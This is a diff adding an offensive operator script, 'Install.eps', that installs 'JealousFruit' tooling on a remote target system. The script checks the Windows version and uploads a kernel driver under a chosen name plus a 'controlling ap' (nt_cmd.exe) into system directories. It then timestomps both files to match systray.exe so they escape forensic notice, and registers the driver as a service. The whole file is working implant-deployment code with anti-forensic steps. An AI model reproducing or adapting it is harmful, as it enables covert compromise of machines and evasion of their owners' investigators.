@@ -1,0 +1,141 @@
+#--------------------------------------------------------
+# File: Install.eps
+#
+# Wrapper script for Install of JealousFruit tools
+#
+# Modifications:
+#  02/28/03	Created.
+#--------------------------------------------------------
+
+@echo off;
+
+if ($argc != 2) {
+    echo "Usage: $argv[0] <driverName>";
+    return false;
+}
+
+string $driver = $argv[1];
+
+@record on;
+
+# check to make sure we're NT 4 Sp4 or higher
+ifnot (`systemversion`) {
+    echo "Unable to get system version -- manually verify that";
+    echo "the target system is Windows NT Sp4 or greater";
+    pause;
+} else {
+    int $major = GetCmdData("sysVerMajor");
+    int $spMajor = GetCmdData("sysSPMajor");
+    if ($major == 4) {
+	# NT box
+	if ($spMajor < 4) {
+	    # Service pack 3 or less
+	    echo "*** Target system is pre-NT Sp4. ***";
+	    echo "    JealousFruit is not compatible with this system";
+	    return false;
+	}
+    }
+}
+
+ifnot (prompt "Are you sure you want to install $driver?") {
+    return false;
+}
+
+# get the root directory
+string $systemroot;
+
+if (`regquery -hive L -subkey "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" -value SystemRoot`) {
+    $systemroot = GetCmdData("enum_keyvalue_data");
+}
+
+ifnot (defined($systemroot[0])) {
+    echo "* Unable to determine system root";
+    return false;
+}
+
+# get resource directory
+ifnot (`getdirectory -scripts`) {
+	echo "* Unable to get scripts directory";
+	return false;
+}
+
+string $ScriptsDir = GetCmdData("dir");
+ifnot (defined($ScriptsDir[0])) {
+	echo "* Unable to retrieve scripts directory";
+	return false;
+}
+
+string $resPath = "$ScriptsDir\\..\\..\\JealousFruit";
+
+@record off;
+
+# make sure it's not already installed
+if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$driver`) {
+    echo "$driver is already installed (key exists)";
+    return false;
+}
+
+if (`dir $driver.sys -path "$systemroot\\system32\\drivers"`) {
+    echo "$driver is already installed (file exists)";
+    return false;
+}
+
+#---------------------------
+# Driver not installed
+#---------------------------
+
+# put the driver
+echo "Uploading the SYS";
+
+# NOTE: notice that we are putting it down NOT permanent and the start time is three, manual start. 
+
+if (`put "$resPath\\tapindis.sys" -name "$systemroot\\system32\\drivers\\$driver.sys" `) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# put down the controlling ap
+if (`put "$resPath\\nt_cmd.exe" -name "$systemroot\\nt_cmd.exe" `) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+
+# match file times for driver
+echo "Matching file time for SYS";
+if (`matchtimes "$systemroot\\system32\\systray.exe" "$systemroot\\system32\\drivers\\$driver.sys"`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED (but continuing anyway)";
+}
+
+# match file times for EXE
+echo "Matching file time for EXE";
+if (`matchtimes "$systemroot\\system32\\systray.exe" "$systemroot\\nt_cmd.exe"`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED (but continuing anyway)";
+}
+
+# add the registry keys
+bool $keysAdded = true;
+echo "Adding registry keys";
+ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value ErrorControl -type REG_DWORD -data 0`) {
+    $keysAdded = false;
+} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value Start -type REG_DWORD -data 3`) {
+    $keysAdded = false;
+} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value Type -type REG_DWORD -data 1`) {
+    $keysAdded = false;
+} 
+
+if ($keysAdded == false) {
+    echo "    FAILED";
+    return false;
+}
+
+# we're done...
+return true;
